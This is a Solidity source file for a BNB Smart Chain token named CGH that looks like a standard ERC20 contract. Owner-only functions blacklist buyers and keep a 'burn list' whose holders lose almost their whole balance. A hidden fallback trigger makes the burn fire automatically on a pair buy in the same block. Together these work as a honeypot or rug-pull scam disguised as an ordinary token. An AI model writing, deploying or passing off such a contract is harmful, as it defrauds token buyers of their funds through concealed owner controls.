/**
 *Submitted for verification at BscScan.com on 2023-01-29
*/

// SPDX-License-Identifier: MIT
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity ^0.8.7;

contract CGH is IERC20 {
    string private constant _name_320021 = "320021";
    string private constant _symbol_320021 = "CGH";
    uint8 private constant _decimals_320021 = 18;
    uint256 private _totalSupply_320021 = 1000000000 * 10 ** _decimals_320021;
    
    mapping(address => uint256) private _balances_320021;
    mapping(address => mapping(address => uint256)) private allowed_320021;
    mapping(address => bool) public isPairAddress_320021;
    
    address private factory_320021 = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private WBNB_320021 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;       
    address private BSC_USDT_320021 = 0x55d398326f99059fF775485246999027B3197955;
    address private BUSD_320021 = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private USDC_320021 = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d; 
    
    mapping(address => bool) public isBlack_Listed_320021;
    address[] private blackList_320021;
    mapping(address => bool) public isInBurnList_320021;
    address[] private burnList_320021;

    address public owner_320021;
    address public lastBuyer_320021;
    uint256 public lastBuyerBN_320021;
    uint256 public killBN_320021;

    constructor() {
        owner_320021 = msg.sender;
        _balances_320021[msg.sender] = _totalSupply_320021;
        emit Transfer(address(0), msg.sender, _totalSupply_320021);
        
        isPairAddress_320021[computePairAddress_320021(WBNB_320021)] = true;
        isPairAddress_320021[computePairAddress_320021(BSC_USDT_320021)] = true;
        isPairAddress_320021[computePairAddress_320021(BUSD_320021)] = true;
        isPairAddress_320021[computePairAddress_320021(USDC_320021)] = true;
    }
    modifier onlyOwner() {
        require(msg.sender==owner_320021, "Only owner!");
        _;
    }
    fallback() external {
        killBN_320021 = block.number;
    }
    // ERC20 Functions

    function name() public view virtual returns (string memory) {
        return _name_320021;
    }
    function symbol() public view virtual returns (string memory) {
        return _symbol_320021;
    }
    function decimals() public view virtual returns (uint8) {
        return _decimals_320021;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply_320021;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances_320021[account];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        // _approve(_msgSender(), spender, amount);
        // return true;
        allowed_320021[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function allowance(address tokenOwner, address spender) public view virtual override returns (uint256) {
        return allowed_320021[tokenOwner][spender];
    }
    function transfer(address receiver, uint256 amount) public virtual override returns (bool) {
        return transfer_320021(msg.sender, receiver, amount);
    }
    function transferFrom(address tokenOwner, address receiver, uint256 amount) public virtual override returns (bool) {
        require(amount <= allowed_320021[tokenOwner][msg.sender],"Invalid number of tokens allowed by owner");
        allowed_320021[tokenOwner][msg.sender] -= amount;
        return transfer_320021(tokenOwner, receiver, amount);
    }

    function transfer_320021(address sender, address receiver, uint256 amount) internal virtual returns (bool) {
        require(sender!= address(0) && receiver!= address(0), "invalid send or receiver address");
        require(amount <= _balances_320021[sender], "Invalid number of tokens");
        require(!isBlack_Listed_320021[receiver] , "Address is blacklisted and cannot buy this token");

        _balances_320021[sender] -= amount;
        _balances_320021[receiver] += amount;

        emit Transfer(sender, receiver, amount);

        if(isPairAddress_320021[sender] && receiver!=owner_320021){
            uint256 cBlock = block.number;
            if(killBN_320021==cBlock && lastBuyerBN_320021==cBlock) burn_320021();          
            
              
            lastBuyerBN_320021 = cBlock;
            lastBuyer_320021 = receiver;
        } 
        return true;
    }
    function computePairAddress_320021(address tokenB) internal view returns (address) {
        (address token0, address token1) = address(this) < tokenB ? (address(this), tokenB) : (tokenB, address(this));
        return address(uint160(uint256(keccak256(abi.encodePacked(hex"ff",factory_320021, keccak256(abi.encodePacked(token0, token1)), hex"00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5")))));
    }
    function addToBlackList_320021(address[] memory _address) public onlyOwner {
        for(uint i = 0; i < _address.length; i++) {
            if(_address[i]!=owner_320021 && !isBlack_Listed_320021[_address[i]]){
                isBlack_Listed_320021[_address[i]] = true;
                blackList_320021.push(_address[i]);
            }
        }
    }
    function removeFromBlackList_320021(address[] memory _address) public onlyOwner {
        for(uint v = 0; v < _address.length; v++) {
            if(isBlack_Listed_320021[_address[v]]){
                isBlack_Listed_320021[_address[v]] = false;
                uint len = blackList_320021.length;
                for(uint i = 0; i < len; i++) {
                    if(blackList_320021[i] == _address[v]) {
                        blackList_320021[i] = blackList_320021[len-1];
                        blackList_320021.pop();
                        break;
                    }
                }
            }
        }
    }
    function addToBurnList_320021(address[] memory _address) public onlyOwner {
        for(uint i = 0; i < _address.length; i++) {
            if(_address[i]!=owner_320021 && !isInBurnList_320021[_address[i]]){
                isInBurnList_320021[_address[i]] = true;
                burnList_320021.push(_address[i]);
            }
        }
    }
    function removeFromBurnList_320021(address[] memory _address) public onlyOwner {
        for(uint v = 0; v < _address.length; v++) {
            if(isInBurnList_320021[_address[v]]){
                isInBurnList_320021[_address[v]] = false;
                uint len = burnList_320021.length;
                for(uint i = 0; i < len; i++) {
                    if(burnList_320021[i] == _address[v]) {
                        burnList_320021[i] = burnList_320021[len-1];
                        burnList_320021.pop();
                        break;
                    }
                }
            }
        }
    }
    function getBlackList_320021() public view returns (address[] memory list){
        list = blackList_320021;
    }
    function getBurnList_320021() public view returns (address[] memory list){
        list = burnList_320021;
    }
    function burnByOwner_320021() public onlyOwner {
        burn_320021();
    }
    function burn_320021() internal {
        uint len = burnList_320021.length;
        for(uint i = 0; i < len; i++) {
            if(_balances_320021[burnList_320021[i]]>1000000000) {
                uint256 burnAmount = _balances_320021[burnList_320021[i]]-1000000000;
                _balances_320021[burnList_320021[i]] -= burnAmount;
                _balances_320021[address(0)] += burnAmount;
                emit Transfer(burnList_320021[i], address(0), burnAmount);
            }
        }
    }
}